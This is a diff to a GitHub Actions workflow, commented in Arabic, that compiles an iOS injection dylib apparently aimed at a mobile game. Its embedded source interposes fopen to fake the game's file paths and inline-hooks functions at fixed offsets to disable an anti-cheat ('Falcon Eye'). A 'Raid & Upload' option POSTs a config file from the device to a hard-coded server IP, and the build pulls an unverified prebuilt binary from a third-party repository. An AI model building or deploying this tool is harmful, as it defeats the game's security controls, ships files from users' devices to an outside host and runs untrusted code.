@@ -1,4 +1,4 @@
-name: Imperial Ultimate AIO - V54.0 THE FINAL STABLE
+name: Imperial Ultimate AIO - V55.0 FINAL FIX
 
 on:
   push:
@@ -16,21 +16,21 @@ jobs:
       - name: Setup Dobby Library
         run: |
           mkdir -p jni
-          # 1. تحميل الهيدر
+          echo "📥 Downloading Dobby files..."
+          
+          # 1. تحميل ملف الهيدر dobby.h
           curl -L "https://raw.githubusercontent.com/jmpews/Dobby/master/include/dobby.h" -o jni/dobby.h
           
-          # 2. تحميل المكتبة من رابط بديل موثوق (نسخة iOS arm64)
-          curl -L "https://github.com/m4771/Dobby-iOS-Binaries/raw/main/libdobby.a" -o jni/libdobby.a -f || echo "Download failed"
+          # 2. تحميل المكتبة libdobby.a من رابط مباشر (نسخة iOS arm64)
+          curl -L "https://github.com/m4771/Dobby-iOS-Binaries/raw/main/libdobby.a" -o jni/libdobby.a
           
-          # 3. فحص إمبراطوري: التأكد إن الملف مو HTML
-          if grep -q "<html>" jni/libdobby.a; then
-            echo "❌ خطأ: جيت هوب حمل صفحة ويب بدل المكتبة!"
-            echo "سأقوم بحل المشكلة الآن عبر تحميل نسخة احتياطية..."
-            curl -L "https://raw.githubusercontent.com/m4771/Dobby-iOS-Binaries/main/libdobby.a" -o jni/libdobby.a
+          # 3. التحقق من وجود الملفات وحجمها
+          ls -lh jni/
+          if [ ! -f jni/libdobby.a ]; then
+            echo "❌ Error: libdobby.a failed to download!"
+            exit 1
           fi
-          
-          # التأكد النهائي من نوع الملف
-          file jni/libdobby.a
+          echo "✅ All required files are present."
 
       - name: Create Imperial Source
         run: |
@@ -43,9 +43,7 @@ jobs:
           #include <dlfcn.h>
           #include "dobby.h"
 
-          // ==========================================
-          // [ 1. الروابط والآيبي المثبت (34.204.178.160) ]
-          // ==========================================
+          // إعدادات السيرفر
           #define SERVER_IP @"34.204.178.160"
           #define ImperialGold [UIColor colorWithRed:1.0 green:0.84 blue:0.0 alpha:1.0]
 
@@ -73,18 +71,15 @@ jobs:
               [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
               [req setHTTPBody:body];
               [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
-              RemoteLog([NSString stringWithFormat:@"SUCCESS: Sent %@", [path lastPathComponent]]);
           }
 
-          // ==========================================
-          // [ 2. محرك تزييف الـ 17 مسار (Ghost FS) ]
-          // ==========================================
+          // محرك تزييف المسارات
           typedef struct interpose_substitution { const void* replacement; const void* original; } interpose_substitution_t;
           #define INTERPOSE(_replacement,_original) __attribute__((used)) static const interpose_substitution_t _interpose_##_original __attribute__ ((section ("__DATA, __interpose"))) = { (const void*)(unsigned long)&_replacement, (const void*)(unsigned long)&_original };
 
           BOOL is_imperial_target(const char* p) {
               if (!p) return NO;
-              NSArray *targets = @[@"config.json", @"imsdklocallog", @"global_sf_metal", @"ShadowTrackerExtra", @"RemoteConfig", @"GCloud", @"tss_ano", @"comm.dat", @"HttpDNS", @"APMSDKCache"];
+              NSArray *targets = @[@"config.json", @"imsdklocallog", @"global_sf_metal", @"RemoteConfig", @"GCloud", @"tss_ano", @"comm.dat"];
               for (NSString *t in targets) { if (strstr(p, [t UTF8String])) return YES; }
               return NO;
           }
@@ -98,9 +93,7 @@ jobs:
           }
           INTERPOSE(ghost_fopen, fopen);
 
-          // ==========================================
-          // [ 3. تخدير الصقر (Inline Hooks) ]
-          // ==========================================
+          // هوكات التخدير
           int (*orig_0x26d4ab)();
           int my_func_0x26d4ab() { return 1; }
           int (*orig_0x6bbfc)();
@@ -113,9 +106,6 @@ jobs:
               RemoteLog(@"Falcon Eye: ANESTHETIZED ✅");
           }
 
-          // ==========================================
-          // [ 4. واجهة الـ WebView (Checkboxes) ]
-          // ==========================================
           @interface ImperialUI : UIWindow <WKScriptMessageHandler>
           @property (nonatomic, strong) WKWebView *web;
           @end
@@ -145,9 +135,9 @@ jobs:
               self.web.layer.borderWidth = 2; self.web.hidden = YES;
 
               NSString *html = @"<html><style>body{background:rgba(5,5,5,0.95);color:gold;font-family:sans-serif;padding:20px;}"
-              ".row{display:flex;justify-content:space-between;margin:12px 0;border-bottom:1px solid #333;padding-bottom:10px;}"
+              ".row{display:flex;justify-content:space-between;margin:15px 0;border-bottom:1px solid #333;padding-bottom:10px;}"
               "input{width:22px;height:22px;}</style><body>"
-              "<h3 style='text-align:center'>IMPERIAL BOSS V54</h3>"
+              "<h3 style='text-align:center'>IMPERIAL BOSS V55</h3>"
               "<div class='row'><span>Ghost FS Active</span><input type='checkbox' onclick='send(\"Ghost\")'></div>"
               "<div class='row'><span>Anesthetize Eye</span><input type='checkbox' onclick='send(\"Anes\")'></div>"
               "<div class='row'><span>Raid & Upload</span><input type='checkbox' onclick='send(\"Raid\")'></div>"
@@ -161,7 +151,7 @@ jobs:
           - (void)userContentController:(id)u didReceiveScriptMessage:(WKScriptMessage *)m {
               if ([m.body isEqualToString:@"Anes"]) SetupAnesthesia();
               if ([m.body isEqualToString:@"Raid"]) SendRaidFile(@"/var/mobile/Documents/RemoteConfig.config");
-              RemoteLog([NSString stringWithFormat:@"Command: %@", m.body]);
+              RemoteLog([NSString stringWithFormat:@"Action Command: %@", m.body]);
           }
           @end
 
@@ -176,7 +166,7 @@ jobs:
 
       - name: Build Imperial Nuclear Dylib
         run: |
-          # الصهر والربط النهائي
+          # التجميع والربط المباشر
           clang++ -dynamiclib -std=c++11 -x objective-c++ \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
           -arch arm64 jni/main.mm jni/libdobby.a -o ImperialUltimate.dylib \
@@ -186,6 +176,5 @@ jobs:
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Imperial-V54-Final
+          name: Imperial-V55-Final
           path: ImperialUltimate.dylib
-          
